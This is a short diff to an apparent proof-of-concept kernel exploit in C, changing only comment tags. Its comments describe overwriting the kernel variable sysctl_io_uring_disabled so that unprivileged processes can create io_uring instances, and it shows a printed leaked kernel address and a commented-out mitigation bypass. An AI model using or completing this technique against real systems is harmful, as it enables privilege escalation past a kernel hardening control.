@@ -1,4 +1,4 @@
-// FZY: Add a simple io_uring check bypass proof of concept that overwrites sysctl_io_uring_disabled from 1 (io_uring creation is disabled for unprivileged processes not in the io_uring_group group) to 0 (all processes can create io_uring instances)
+// SDP: Add a simple io_uring check bypass proof of concept that overwrites sysctl_io_uring_disabled from 1 (io_uring creation is disabled for unprivileged processes not in the io_uring_group group) to 0 (all processes can create io_uring instances)
 
 #include <fcntl.h>
 #include <stdio.h>
@@ -194,7 +194,7 @@ int main(int argc, char *argv[]) {
 
     printf("[+] sysctl_io_uring_disabled address from kernel memory: 0x%lx\n", sysctl_io_uring_disabled_addr);
 
-    // FZY: Enable to bypass the mitigation and evaluate if the rest steps work correctly
+    // Enable to bypass the mitigation and evaluate if the rest steps work correctly
     // sysctl_io_uring_disabled_addr = sysctl_io_uring_disabled_addr | 0xFFFF000000000000;
   }
   
